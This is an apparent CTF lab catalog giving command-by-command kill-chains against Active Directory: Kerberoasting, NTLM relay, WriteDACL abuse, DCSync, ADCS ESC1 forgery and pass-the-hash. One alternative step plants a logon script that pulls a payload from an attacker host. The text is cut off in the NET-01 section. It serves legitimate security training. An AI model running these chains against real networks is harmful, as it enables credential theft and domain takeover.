# Kill-Chain Catalog — Advanced Cybersecurity Lab

This document is the authoritative kill-chain reference for the CTF Scenario Catalog. It
establishes the methodology standard that all phases use without deviation, then provides
full kill-chain write-ups for the nine Active Directory and Network Protocol scenarios
(AD-01 through AD-05, NET-01 through NET-04). Phases 3 and 4 inherit the methodology
section exactly as written here. Instructors and reviewers should consult the Methodology
section first before reading any individual kill-chain.

---

## Methodology

### 1.1 Kill-Chain Stage Format

Each kill-chain is a numbered sequence of stages. Every stage uses the following four-field
block — no exceptions:

```
### Stage N: [Stage Name]

**Action:** [One sentence, second person ("You ..."), imperative, names the technique not the tool]
**Command:**
```fenced code block — exact syntax, ALLCAPS placeholders, one command per line```
**Expected Output:** [Representative terminal snippet; for passive/listening stages: "Listening — no output until authentication event."]
**TTP:** [T####.### — Technique Name](https://attack.mitre.org/techniques/T####/###/) · [Tactic]
```

**Rules for each field:**

- **Stage name** identifies the attack technique, not the tool (e.g., "Kerberoasting" not
  "Running GetUserSPNs.py"). The name should orient the student to the adversarial action.
- **Action** is written in second person: "You request...", "You enumerate...", "You relay...".
  One sentence only. Names the technique or outcome, not the specific tool invocation.
- **Command block** uses ALLCAPS for all values students must substitute (IP addresses,
  domain names, usernames, passwords, file paths). Structural values that are the same
  in every lab run — `corp.local`, `127.0.0.1`, well-known ports — are written literally.
  One logical operation per code block; alternatives are presented with a `# Alternative:`
  comment separator.
- **Expected Output** is truncated and representative — just enough for the student to
  confirm they are on the correct path. For passive or listening stages, use the literal
  string: `Listening — no output until authentication event.`
- **TTP** cites one primary MITRE ATT&CK technique per stage via inline hyperlink. If a
  stage maps to multiple techniques (e.g., discovery and credential access), list both
  separated by ` · `. Do not list more than three TTPs per stage. For flag capture stages
  and pre-flight configuration steps, write `**TTP:** —`.

### 1.2 Flag Placement Convention

Flags are dedicated stages with `[FLAG N]` prefixed to the stage heading. They are never
inline notes or parenthetical remarks inside an Action field.

Flag stage format:

```
### [FLAG N] Stage N: Flag Capture — [Location Description]

**Action:** You retrieve Flag N from [location].
**Command:**
```[command to read the flag]```
**Expected Output:** `CTF{...flag_value_placeholder...}`
**TTP:** — (flag capture, not an adversarial technique)
```

**Justification:** Placing flags as stages preserves narrative flow, makes multi-flag
scenarios (AD-05 has two flags) unambiguous at a glance, and lets instructors locate
the flag stage and verify that the correct preceding access step produced the access
required to reach it.

### 1.3 VM Role Labeling

Use functional role names in stage headings, not OS names or VM numbers:

| Role | Label | When to use |
|------|-------|-------------|
| Kali attacker VM | `[Attacker]` | Only when all commands in the stage run on the attacker VM; omit the tag — the attacker is the default unlabeled execution context |
| Windows Domain Controller | `[DC]` | When the command executes on the DC |
| Windows member server | `[MemberSrv]` | When the command executes on the member server |
| Ubuntu pivot / service host | `[PivotHost]` | When the command executes on an Ubuntu victim |

The label appears in parentheses after the stage name: `### Stage N: Kerberoasting from Foothold [MemberSrv]`

**Justification:** VM numbers (VM1/VM2) are brittle across scenarios with different VM
counts. OS names (Kali, Windows, Ubuntu) are redundant with the VM profiles defined in
CLAUDE.md. Functional role names are self-documenting and consistent with red-team report
conventions.

### 1.4 TTP Citation Style

Format: `[T####.### — Technique Name](https://attack.mitre.org/techniques/T####/###/) · Tactic`

For flag capture stages: `**TTP:** —` (no technique applies; flag capture is not an
adversarial technique).

For stages with assumed mappings — specifically mitm6 (mapped to T1557.001) and WriteDACL
abuse on AD objects (mapped to T1222.001) — include a brief explanatory note after the TTP
line documenting the mapping rationale. See the NET-02 and AD-03 kill-chains for examples
of these notes applied in context.

---

## Active Directory / Windows Kill-Chains

---

### AD-01: Kerberoasting and AS-REP Roasting

**VMs:** Attacker (Kali), DC (Windows Server 2019, `corp.local`)
**Difficulty:** Easy
**Flags:** 1

This kill-chain exercises two complementary Kerberos credential-access techniques —
Kerberoasting (targeting service accounts with registered SPNs) and AS-REP Roasting
(targeting user accounts with pre-authentication disabled) — and combines them with offline
hash cracking to recover cleartext credentials.

---

#### Stage 1: SPN Enumeration

**Action:** You enumerate service accounts with registered SPNs to identify Kerberoasting
targets.

**Command:**
```bash
# Primary: Impacket GetUserSPNs.py
GetUserSPNs.py CORP.LOCAL/LOWPRIV:PASSWORD -dc-ip DC_IP -request -outputfile tgs.hashes

# Alternative: NetExec LDAP module
nxc ldap DC_IP -u LOWPRIV -p PASSWORD --kerberoast tgs.hashes
```

**Expected Output:**
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$a1b2c3...
$krb5tgs$23$*svc_http$CORP.LOCAL$corp.local/svc_http*$d4e5f6...
```

**TTP:** [T1087.002 — Domain Account](https://attack.mitre.org/techniques/T1087/002/) · Discovery

---

#### Stage 2: TGS Ticket Harvest

**Action:** You request TGS tickets for each identified SPN to collect the encrypted ticket
material for offline cracking.

**Command:**
```bash
# Tickets are written to tgs.hashes by Stage 1 -request flag.
# Inspect the hash prefix to determine encryption type before cracking:
head -1 tgs.hashes
# $krb5tgs$23$  → RC4 (mode 13100)
# $krb5tgs$17$  → AES-128 (mode 19600)
# $krb5tgs$18$  → AES-256 (mode 19700)
```

**Expected Output:**
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$a1b2c3d4...
```

**TTP:** [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) · Credential Access

---

#### Stage 3: AS-REP Enumeration

**Action:** You enumerate accounts with Kerberos pre-authentication disabled to collect
AS-REP blobs for offline cracking.

**Command:**
```bash
# Primary: Impacket GetNPUsers.py
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat -outputfile asrep.hashes

# Alternative: NetExec LDAP module
nxc ldap DC_IP -u LOWPRIV -p PASSWORD --asreproast asrep.hashes
```

**Expected Output:**
```
$krb5asrep$23$jdoe@CORP.LOCAL:3a4b5c6d7e8f...
```

**TTP:** [T1558.004 — AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) · Credential Access

---

#### Stage 4: Offline Hash Cracking

**Action:** You crack the collected TGS and AS-REP hashes offline using hashcat with the
rockyou wordlist, selecting the correct mode based on the hash prefix you inspected in
Stage 2.

**Command:**
```bash
# Kerberoasting — RC4 (prefix: $krb5tgs$23$)
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt

# Kerberoasting — AES-128 (prefix: $krb5tgs$17$)
hashcat -m 19600 tgs.hashes /usr/share/wordlists/rockyou.txt

# Kerberoasting — AES-256 (prefix: $krb5tgs$18$)
hashcat -m 19700 tgs.hashes /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — RC4 (prefix: $krb5asrep$23$)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

**Expected Output:**
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*:Password123
```

**TTP:** [T1110.002 — Password Cracking](https://attack.mitre.org/techniques/T1110/002/) · Credential Access

---

### [FLAG 1] Stage 5: Flag Capture — Protected SMB Share

**Action:** You retrieve Flag 1 by authenticating to the protected SMB share using the
cracked service account credential.

**Command:**
```bash
smbclient \\\\DC_IP\\flag_share -U CORP.LOCAL\\SVC_ACCOUNT%CRACKED_PASSWORD
# At the smb: \> prompt:
get flag.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

#### Note: AES-Only Encryption Pitfall

Service accounts configured with `msDS-SupportedEncryptionTypes` locked to AES-only
produce `$krb5tgs$17$` (AES-128) or `$krb5tgs$18$` (AES-256) hashes. Hashcat mode 13100
will report `0 hashes loaded` if given an AES hash — it only accepts RC4 (`$23$`) format.
Always inspect the hash prefix before selecting a hashcat mode.

---

### AD-02: LLMNR/NBT-NS Poisoning and NTLM Relay

**VMs:** Attacker (Kali), MemberSrv (Windows Server 2019, SMB signing disabled)
**Difficulty:** Medium
**Flags:** 1

> **AD-02 vs NET-01 Differentiator:** AD-02 uses Responder in active poisoning mode
> (default, no `-A` flag) — it answers LLMNR/NBT-NS broadcast queries with the attacker IP.
> NET-01 uses Responder in analysis mode (`-A`) and relies on organic unsigned-SMB traffic
> already present on the wire. The relay outcome also differs: AD-02 achieves command
> execution (T1021.002); NET-01 achieves share read access (T1039).

---

#### Stage 1: SMB Signing Verification

**Action:** You enumerate the subnet to identify hosts with SMB signing disabled —
a prerequisite for NTLM relay.

**Command:**
```bash
nxc smb SUBNET/24 --gen-relay-list targets.txt
```

**Expected Output:**
```
SMB   MEMBERSRV_IP   445   MEMBERSRV   [*] Windows Server 2019 (name:MEMBERSRV) (signing:False)
```
`targets.txt` is created containing one IP per line for each host with signing disabled.

**TTP:** [T1087.002 — Domain Account](https://attack.mitre.org/techniques/T1087/002/) · Discovery

---

#### Stage 2: Responder Configuration

**Action:** You disable Responder's built-in SMB and HTTP servers so they do not intercept
authentications before ntlmrelayx can relay them.

**Command:**
```bash
# Edit Responder configuration to disable the SMB and HTTP listeners:
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Verify the change:
grep -E "^(SMB|HTTP)" /etc/responder/Responder.conf
```

**Expected Output:**
```
SMB = Off
HTTP = Off
```

**TTP:** — (configuration step, not an adversarial technique)

> **Warning:** If `SMB = On` or `HTTP = On` remain set in `Responder.conf`, Responder
> intercepts the authentication before ntlmrelayx can relay it. You will see an NTLMv2
> hash captured in Responder output, but ntlmrelayx will show no relay events. The SMB
> and HTTP servers in Responder must be Off for relay to work.

---

#### Stage 3: Start ntlmrelayx

**Action:** You start ntlmrelayx targeting the relay list, requesting an interactive shell
mode on successful relay.

**Command:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

`-smb2support` enables SMB2 relay (required for modern Windows).
`-i` spawns an interactive SMB shell accessible via `nc 127.0.0.1 11000` on a successful
relay event.

**Expected Output:**
```
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Servers started, waiting for connections
```

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

---

#### Stage 4: Start Responder (Active Poisoning)

**Action:** You start Responder in active poisoning mode to intercept LLMNR and NBT-NS
broadcast name resolution queries on the network.

**Command:**
```bash
sudo responder -I ATTACKER_INTERFACE -rdw
```

**Expected Output:**
`Listening — no output until a domain host broadcasts an LLMNR/NBT-NS query for a non-existent name.`

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

---

#### Stage 5: Relay Trigger and Interactive Shell

**Action:** You wait for a domain user to trigger an LLMNR broadcast (by navigating to a
non-existent UNC path such as `\\NONEXISTENT\share`), then connect to the relayed
interactive shell.

**Command:**
```bash
# After ntlmrelayx reports a successful relay:
nc 127.0.0.1 11000
```

**Expected Output:**
```
[*] SMBD-Thread-3: Received connection from VICTIM_IP
[*] Authenticating against smb://MEMBERSRV_IP as CORP/JDOE SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```
Then `nc 127.0.0.1 11000` opens a Windows SMB shell on MemberSrv.

**TTP:** [T1021.002 — SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) · Lateral Movement

---

### [FLAG 1] Stage 6: Flag Capture — Member Server Desktop [MemberSrv]

**Action:** You retrieve Flag 1 from the Administrator desktop on the relayed member server
via the interactive SMB shell.

**Command:**
```
type C:\Users\Administrator\Desktop\flag.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

### AD-03: BloodHound ACL Abuse Path

**VMs:** Attacker (Kali), DC (Windows Server 2019, `corp.local`)
**Difficulty:** Medium
**Flags:** 1

---

#### Stage 1: BloodHound CE Pre-Flight Verification

**Action:** You confirm that BloodHound Community Edition is running on the attacker VM
before beginning data collection.

**Command:**
```bash
docker ps | grep bloodhound
```

**Expected Output:**
```
a1b2c3d4e5f6   bloodhoundce/bloodhound   "bloodhound"   Up 3 minutes
f6e5d4c3b2a1   docker.io/library/postgres "postgres"     Up 3 minutes
```
Both the `bloodhound` and `bloodhound-db` (postgres) containers must show `Up`. The web
UI is available at `http://localhost:8080`.

**TTP:** — (pre-flight check, not an adversarial technique)

---

#### Stage 2: SharpHound CE Data Collection [DC]

**Action:** You run SharpHound on the domain controller to collect all Active Directory
relationship data for BloodHound CE analysis.

**Command:**
```powershell
.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\loot
```

**Expected Output:**
```
2026-06-12T07:30:00.000Z [*] Resolved collection methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-06-12T07:30:01.000Z [*] Done creating task: 20260612073001_BloodHound.zip
```

> **CRITICAL — BloodHound CE Collector Requirement:** Download SharpHound from the
> BloodHound CE web UI only: navigate to `http://localhost:8080` → Settings →
> Download Collectors → SharpHound. Do **not** use a legacy SharpHound binary downloaded
> from the BloodHound-Legacy GitHub repository (`BloodHoundAD/BloodHound`). Legacy
> SharpHound produces a ZIP that imports into BloodHound CE without error but with zero
> nodes — the "Nodes" counter stays at 0 after upload. The two formats are incompatible.

**TTP:** [T1087.002 — Domain Account](https://attack.mitre.org/techniques/T1087/002/) · Discovery · [T1069.002 — Domain Groups](https://attack.mitre.org/techniques/T1069/002/) · Discovery

---

#### Stage 3: BloodHound CE Path Analysis

**Action:** You upload the SharpHound ZIP to BloodHound CE and run the "Shortest Paths to
Domain Admin" query to identify the abusable ACL edge.

**Command:**
```
# In browser: navigate to http://localhost:8080
# Click "Upload" icon → select 20260612073001_BloodHound.zip
# Navigate to: Analysis → Pre-built Queries → "Shortest Paths to Domain Admin"
# Identify the edge: LOWPRIV --[WriteDACL]--> Domain Admins
```

**Expected Output:** BloodHound CE renders a graph path showing `LOWPRIV` connected to
`Domain Admins` via a `WriteDACL` edge.

**TTP:** [T1069.002 — Domain Groups](https://attack.mitre.org/techniques/T1069/002/) · Discovery

---

#### Stage 4: WriteDACL Exploitation via PowerView [DC]

**Action:** You abuse the WriteDACL edge identified by BloodHound to grant your compromised
account full control over the Domain Admins group.

**Command:**
```powershell
Import-Module .\PowerView.ps1

# Grant LOWPRIV full control (WriteDACL → GenericAll) over Domain Admins:
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity LOWPRIV -Rights All
```

**Expected Output:** No output on success — PowerShell returns silently when the ACL
modification completes.

**TTP:** [T1222.001 — Windows File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/001/) · Defense Evasion · [T1098 — Account Manipulation](https://attack.mitre.org/techniques/T1098/) · Privilege Escalation

> **Note on T1222.001 mapping:** MITRE ATT&CK covers Windows ACL modification at the
> file/directory level in T1222.001. There is no dedicated sub-technique for Active
> Directory object DACL modification (WriteDACL on an AD object such as a group). T1222.001
> is the standard community mapping for this action; T1098 captures the privilege escalation
> outcome. Both are cited together per community convention.

##### Alternative Path: GenericWrite on Target User

If BloodHound surfaces a `GenericWrite` edge on a target user rather than `WriteDACL` on a
group, use:

```powershell
# GenericWrite on a user — set a malicious logon script:
Set-DomainObject -Identity TARGETUSER -SET @{scriptpath="\\ATTACKER_IP\share\payload.ps1"}
```

The primary lab path is WriteDACL on Domain Admins — it is simpler and deterministic.
GenericWrite via logon script requires waiting for the target user to log in.

---

#### Stage 5: Add Self to Domain Admins [DC]

**Action:** You add your compromised account to the Domain Admins group using the rights
you granted yourself in Stage 4.

**Command:**
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members LOWPRIV

# Verify membership:
net group "Domain Admins" /domain
```

**Expected Output:**
```
Group name     Domain Admins
Members        LOWPRIV   Administrator   ...
```

**TTP:** [T1098 — Account Manipulation](https://attack.mitre.org/techniques/T1098/) · Persistence

---

#### Stage 6: DCSync — Domain Credentials Dump

**Action:** You perform a DCSync attack to extract the Administrator NT hash from the domain
controller using your newly acquired Domain Admin rights.

**Command:**
```bash
secretsdump.py CORP.LOCAL/LOWPRIV:PASSWORD@DC_IP
```

**Expected Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTHASH:::
```

**TTP:** [T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/) · Credential Access

---

### [FLAG 1] Stage 7: Flag Capture — Domain Controller Desktop [DC]

**Action:** You retrieve Flag 1 from the domain controller using the Administrator NT hash
for Pass-the-Hash authentication.

**Command:**
```bash
evil-winrm -i DC_IP -u administrator -H NTHASH
# At the PS C:\> prompt:
type C:\Users\Administrator\Desktop\flag.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

### AD-04: ADCS ESC1 Certificate Abuse

**VMs:** Attacker (Kali), DC (Windows Server 2019 with ADCS installed)
**Difficulty:** Hard
**Flags:** 1

---

#### Stage 1: ADCS Enumeration

**Action:** You enumerate Active Directory Certificate Services to identify certificate
templates vulnerable to ESC1 misconfiguration.

**Command:**
```bash
certipy find -u LOWPRIV@corp.local -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
```

**Expected Output:**
```
Certificate Authorities
  0
    CA Name         : CORP-CA
    DNS Name        : DC.corp.local
    ...
Certificate Templates
  0
    Template Name   : VULNERABLETEMPLATE
    ...
    [!] Vulnerabilities
      ESC1          : 'CORP.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
    Client Authentication : True
    Enrollee Supplies Subject : True
    Enrollment Rights : Domain Users
```

**TTP:** [T1087.002 — Domain Account](https://attack.mitre.org/techniques/T1087/002/) · Discovery · [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) · Credential Access

---

> **ESC1 Three-Condition Checklist:** All three conditions must be true for ESC1 to succeed:
> 1. The template has the Client Authentication Extended Key Usage (EKU).
> 2. The `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is set — meaning the enrollee controls the
>    Subject Alternative Name (SAN).
> 3. Low-privileged users (Domain Users or equivalent) have enrollment rights on the template.
>
> Certipy's `-vulnerable -stdout` output checks all three automatically and flags templates
> meeting all conditions with `[!] Vulnerabilities: ESC1`. If any condition is absent, the
> template is not ESC1-exploitable.

---

#### Stage 2: Rogue Certificate Request

**Action:** You request a certificate from the vulnerable template, supplying a SAN that
impersonates the domain Administrator account.

**Command:**
```bash
certipy req -u LOWPRIV@corp.local -p 'PASSWORD' \
  -ca CORP-CA \
  -template VULNERABLETEMPLATE \
  -upn administrator@corp.local \
  -dc-ip DC_IP
```

> Copy the values for `-ca` and `-template` character-for-character from the `certipy find`
> output in Stage 1. These strings are case-sensitive exact matches. A single character
> difference produces: `ERROR: The requested certificate template is not supported by this CA`.

**Expected Output:**
```
[*] Saved certificate and private key to 'administrator.pfx'
```

**TTP:** [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) · Credential Access

---

#### Stage 3: PKINIT Authentication

**Action:** You authenticate to the domain controller using the forged certificate via
PKINIT to retrieve the Administrator NT hash.

**Command:**
```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

**Expected Output:**
```
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:NTHASH
```

**TTP:** [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) · Credential Access · [T1078.002 — Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) · Privilege Escalation

---

#### Stage 4: Domain Admin Access via Pass-the-Hash

**Action:** You authenticate to the domain controller using the Administrator NT hash
recovered in Stage 3.

**Command:**
```bash
evil-winrm -i DC_IP -u administrator -H NTHASH
```

**Expected Output:**
```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**TTP:** [T1078.002 — Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) · Lateral Movement

---

### [FLAG 1] Stage 5: Flag Capture — Domain Controller Desktop [DC]

**Action:** You retrieve Flag 1 from the Administrator desktop on the domain controller.

**Command:**
```
type C:\Users\Administrator\Desktop\flag.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

#### Note: Certipy Template/CA Name Precision

If `certipy req` returns `ERROR: The requested certificate template is not supported by
this CA`, the `-ca` or `-template` value does not match exactly. Copy both values
character-for-character from the `certipy find -vulnerable -stdout` output — the strings
are case-sensitive and must match the CA's internal name exactly.

---

### AD-05: Conti-Style APT Chain

**VMs:** Attacker (Kali), MemberSrv (Windows Server 2019), DC (Windows Server 2019, `corp.local`)
**Difficulty:** Hard
**Flags:** 2 — Flag 1 at MemberSrv foothold, Flag 2 at DC after WinRM lateral movement

This is the only scenario in this phase with two flags. The chain enforces two distinct
lateral movement protocols: SMB relay (first hop, T1021.002) and WinRM (second hop,
T1021.006). Students must use both — the scenario design explicitly requires protocol
diversity across hops.

---

#### Stage 1: SMB Signing Verification

**Action:** You enumerate the subnet to identify hosts with SMB signing disabled for
NTLM relay targeting.

**Command:**
```bash
nxc smb SUBNET/24 --gen-relay-list targets.txt
```

**Expected Output:**
```
SMB   MEMBERSRV_IP   445   MEMBERSRV   [*] Windows Server 2019 (signing:False)
```

**TTP:** [T1087.002 — Domain Account](https://attack.mitre.org/techniques/T1087/002/) · Discovery

---

#### Stage 2: Responder Configuration

**Action:** You disable Responder's built-in SMB and HTTP servers to prevent interference
with ntlmrelayx.

**Command:**
```bash
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
grep -E "^(SMB|HTTP)" /etc/responder/Responder.conf
```

**Expected Output:**
```
SMB = Off
HTTP = Off
```

**TTP:** — (configuration step, not an adversarial technique)

> **Warning:** If `SMB = On` or `HTTP = On` remain in `Responder.conf`, Responder captures
> the authentication before ntlmrelayx can relay it. You will see `NTLMv2-SSP Hash` in
> Responder output but no relay events in ntlmrelayx. Both must be `Off`.

---

#### Stage 3: Start ntlmrelayx

**Action:** You start ntlmrelayx targeting the relay list with interactive shell mode.

**Command:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

**Expected Output:**
```
[*] Servers started, waiting for connections
```

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

---

#### Stage 4: Start Responder (Active Poisoning)

**Action:** You start Responder in active poisoning mode to intercept LLMNR broadcast
queries on the network segment.

**Command:**
```bash
sudo responder -I ATTACKER_INTERFACE -rdw
```

**Expected Output:**
`Listening — no output until a domain host broadcasts an LLMNR/NBT-NS query for a non-existent name.`

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

---

#### Stage 5: Relay to MemberSrv and Interactive Shell

**Action:** You wait for an LLMNR broadcast event and then connect to the interactive SMB
shell on the relayed member server.

**Command:**
```bash
# After ntlmrelayx reports successful relay:
nc 127.0.0.1 11000
```

**Expected Output:**
```
[*] Authenticating against smb://MEMBERSRV_IP as CORP/JDOE SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

**TTP:** [T1021.002 — SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) · Lateral Movement

---

### [FLAG 1] Stage 6: Flag Capture — Member Server Foothold [MemberSrv]

**Action:** You retrieve Flag 1 from the Administrator desktop on the relayed member server.

**Command:**
```
type C:\Users\Administrator\Desktop\flag1.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

#### Stage 7: Kerberoasting from Foothold [MemberSrv]

**Action:** You run Rubeus from the relayed SMB shell to request TGS tickets for
Kerberoastable service accounts on the domain.

**Command:**
```
# In the relay shell, Rubeus is pre-staged at C:\Tools\Rubeus.exe
# Discover pre-staged tools first:
dir C:\Tools\

# Run Kerberoasting:
C:\Tools\Rubeus.exe kerberoast /nowrap /outfile:C:\loot\tgs.txt
```

**Expected Output:**
```
[*] SamAccountName  : svc_mssql
[*] ServicePrincipalName : MSSQL/DC.corp.local
[*] Hash              : $krb5tgs$23$*SVC_MSSQL$CORP.LOCAL$...
[*] Roasted hashes written to C:\loot\tgs.txt
```

**TTP:** [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) · Credential Access

---

#### Stage 8: Hash Exfiltration

**Action:** You retrieve the TGS hash file from the member server to the attacker machine
for offline cracking.

**Command:**
```bash
# From attacker Kali — pull the file from the relay shell using smbclient:
smbclient \\\\MEMBERSRV_IP\\C$ -U CORP\\RELAYED_USER
# At smb: \> prompt:
cd loot
get tgs.txt
```

**Expected Output:**
```
getting file \loot\tgs.txt of size NNNN as tgs.txt
```

**TTP:** [T1039 — Data from Network Shared Drive](https://attack.mitre.org/techniques/T1039/) · Collection

---

#### Stage 9: Offline Hash Cracking

**Action:** You inspect the hash prefix and crack the TGS hash offline to recover the
service account cleartext password.

**Command:**
```bash
# Inspect hash prefix first:
head -1 tgs.txt
# $krb5tgs$23$ → RC4 → mode 13100

hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

**Expected Output:**
```
$krb5tgs$23$*SVC_MSSQL$CORP.LOCAL$...*:ServicePass123
```

**TTP:** [T1110.002 — Password Cracking](https://attack.mitre.org/techniques/T1110/002/) · Credential Access

---

#### Stage 10: WinRM Lateral Movement to DC

**Action:** You verify WinRM access and authenticate to the domain controller using the
cracked service account credential.

**Command:**
```bash
# Verify WinRM is open and credential is valid:
nxc winrm DC_IP -u SVC_MSSQL -p 'CRACKEDPASSWORD'

# Authenticate:
evil-winrm -i DC_IP -u SVC_MSSQL -p 'CRACKEDPASSWORD'
```

**Expected Output:**
```
WINRM   DC_IP   5985   DC   [+] CORP.LOCAL\SVC_MSSQL:CRACKEDPASSWORD (Pwn3d!)
```

**TTP:** [T1021.006 — Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) · Lateral Movement

> **Protocol Enforcement:** First hop used SMB relay via ntlmrelayx
> ([T1021.002](https://attack.mitre.org/techniques/T1021/002/)). Second hop uses WinRM
> via evil-winrm ([T1021.006](https://attack.mitre.org/techniques/T1021/006/)). These are
> two distinct remote execution protocols as required by the scenario design.

---

### [FLAG 2] Stage 11: Flag Capture — DC Compromise [DC]

**Action:** You retrieve Flag 2 from the domain controller Administrator desktop, completing
the two-hop APT chain.

**Command:**
```
type C:\Users\Administrator\Desktop\flag2.txt
```

**Expected Output:** `CTF{...flag_value_placeholder...}`

**TTP:** — (flag capture, not an adversarial technique)

---

## Network Protocol Exploitation Kill-Chains

---

### NET-01: SMB Relay via Unsigned Shares

**VMs:** Attacker (Kali), Victim (Windows workstation, SMB signing disabled)
**Difficulty:** Easy
**Flags:** 1

> **NET-01 vs AD-02 Differentiator:** NET-01 uses Responder in analysis-only mode (`-A`) —
> Responder records LLMNR/NBT-NS queries without answering them, so no active poisoning
> occurs. The relay exploits existing unsigned-SMB traffic already on the wire. The relay
> outcome is share read access (T1039), not command execution. AD-02 uses active poisoning
> mode (no `-A`), answers broadcast queries, and achieves command execution (T1021.002).

---

#### Stage 1: Passive Network Analysis

**Action:** You start Responder in analysis mode to observe LLMNR/NBT-NS broadcast traffic
without poisoning any responses.

**Command:**
```bash
sudo responder -I ATTACKER_INTERFACE -A
```

`-A` enables analysis mode: Responder records hostnames and usernames seen making broadcast
queries but does not answer any of them.

**Expected Output:**
`Listening — no output until authentication event.`
When traffic is observed: host and username pairs logged with their query type (LLMNR,
NBT-NS). No hashes are captured in analysis mode.

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Collection

---

#### Stage 2: Identify Unsigned SMB Targets

**Action:** You enumerate the subnet to generate a relay target list of hosts with SMB
signing disabled.

**Command:**
```bash
nxc smb SUBNET/24 --gen-relay-list unsigned_targets.txt
```

**Expected Output:**
```
SMB   VICTIM_IP   445   VICTIM   [*] Windows 10 (signing:False) (SMBv1:False)
```

**TTP:** [T1087.002 — Domain Account](https://attack.mitre.org/techniques/T1087/002/) · Discovery

---

#### Stage 3: Start ntlmrelayx

**Action:** You start ntlmrelayx targeting unsigned hosts; the default behavior without `-c`
or `-i` lists shares and dumps SAM on successful relay.

**Command:**
```bash
ntlmrelayx.py -tf unsigned_targets.txt -smb2support
```

**Expected Output:**
```
[*] Servers started, waiting for connections
```

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

---

#### Stage 4: Wait for Organic Authentication

**Action:** You wait for a domain user on the network to trigger an LLMNR broadcast by
navigating to a non-existent UNC path, at which point ntlmrelayx relays the authentication
to a target host.

**Command:**
```bash
# No command — monitor ntlmrelayx output.
# A domain user opens Explorer and types \\FILESERVER\share
# DNS fails → LLMNR broadcast occurs → ntlmrelayx relays authentication
```

**Expected Output:**
```
[*] SMBD-Thread-4: Connection from CORP/JDOE@VICTIM_IP controlled, attacking target smb://TARGET_IP
[*] Authenticating against smb://TARGET_IP as CORP/JDOE SUCCEED
[-] Connecting Share(1:IPC$)
[-] Connecting Share(2:flag_share$)
[*] Found readable share flag_share$
```

**TTP:** [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access

---

### [FLAG 1] Stage 5: Flag Capture from Relayed Share Access

**Action:** You retrieve Flag 1 from the flag share using the read access granted by the
relayed credential.

**Command:**
```bash
smbclient \\\\TARGET_IP\\flag_share$ -U CORP/JDOE
# At smb: \> prompt (no password prompt — relay session active):
get flag.txt
```

